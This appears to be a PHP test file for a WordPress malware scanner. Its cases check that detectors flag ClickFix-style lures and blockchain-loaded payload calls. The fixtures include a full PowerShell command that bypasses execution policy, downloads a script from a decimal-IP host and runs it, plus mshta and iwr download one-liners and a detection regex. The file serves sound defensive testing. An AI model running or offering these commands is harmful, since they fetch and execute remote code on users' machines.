    $js = "var badVal=/getActiveScripts|hasDemoPage|nc-blob|fine-work-team|nochain/i;Object.keys(localStorage).forEach(function(k){if(badVal.test(localStorage.getItem(k)))localStorage.removeItem(k);});";
    expect(sentinel_ids((new Sky_Sentinel_Content_Detectors(sentinel_signatures()))->scan('page/example.org:home.html', $js)))->not->toContain('F11');
});

test('F11 still knows hasDemoPage as a contract call', function () {
    $js = "var c=new ethers.Contract(t,['function hasDemoPage() view returns (bool)'],p);";
    expect(sentinel_ids((new Sky_Sentinel_Content_Detectors(sentinel_signatures()))->scan('wp-content/plugins/p/a.js', $js)))->toContain('F11');
    // And as the runtime calls it, with no other indicator beside it.
    expect(sentinel_ids((new Sky_Sentinel_Content_Detectors(sentinel_signatures()))->scan('wp-content/plugins/p/b.js', 'if(await contract.hasDemoPage()){go()}')))->toContain('F11');
});

// ---- 0.4.12: the ChatGPT Custom GPT ClickFix campaign (Huntress, 2026-09) --

test('F14 knows the Custom GPT campaign\'s command on its own, with no lure words around it', function () {
    // The Google Sites page told victims to paste this. 'powershell -' is
    // lowercase in the list and the command reads PowerShell.exe" -Execution...
    $cmd = '"C:\\WINDOWS\\system32\\WindowsPowerShell\\v1.0\\PowerShell.exe" -ExecutionPolicy Bypass "irm 1614733393/12 | Out-File $env:temp\\1777.ps1;& $env:temp\\1777.ps1"';
    $f = (new Sky_Sentinel_Content_Detectors(sentinel_signatures()))->scan('page/site:home.html', "<code>{$cmd}</code>");
    expect(sentinel_ids($f))->toContain('F14');
    $f14 = array_values(array_filter($f, fn($x) => 'F14' === $x->detector))[0];
    expect($f14->severity)->toBe('high')
        ->and($f14->detail['strong'])->toContain('PowerShell with a flag')->toContain('download from a decimal-IP host');
});

test('F14 strong terms ignore case, and each new shape fires alone', function () {
    $d = new Sky_Sentinel_Content_Detectors(sentinel_signatures());
    $strong = fn(string $s) => ($x = array_values(array_filter($d->scan('page/x.html', $s), fn($y) => 'F14' === $y->detector))) ? $x[0]->detail['strong'] : array();
    expect($strong('Press WIN + R and paste'))->toBe(array('Win + R'))
        ->and($strong('Run MSHTA http://x'))->toBe(array('mshta'))
        ->and($strong("powershell.exe -w hidden -c go"))->toContain('PowerShell with a flag')
        ->and($strong("'PowerShell' -NoProfile"))->toContain('PowerShell with a flag')
        ->and($strong('iwr -Uri http://3232235777/p.ps1'))->toBe(array('download from a decimal-IP host'))
        ->and($strong('<a href="https://1614733393:8080/app/x.msi">'))->toBe(array('download from a decimal-IP host'))
        ->and($strong('fetch("http://1614733393")'))->toBe(array('download from a decimal-IP host'));
});

test('F14 is quiet on PowerShell named without a flag, and on numbers that are not a host', function () {
    $d = new Sky_Sentinel_Content_Detectors(sentinel_signatures());
    foreach (array(
        'Requires Windows PowerShell 5.1 or later.',
        'Open PowerShell and run the installer.',
        '<script src="https://cdn.example.com/1614733393/app.js"></script>',  // the number is a path, not the host
        '<link href="/style.css?ver=1614733393">',
        'curl https://example.com/1614733393/',
        'http://127.0.0.1/',
        'https://12345678.example.com/',          // a real domain that starts with digits
        'irm https://1614733393123/x',             // too many digits to be an IPv4 host
    ) as $s) {
        expect(sentinel_ids($d->scan('wp-content/plugins/p/readme.txt', $s)))->not->toContain('F14');
    }
});
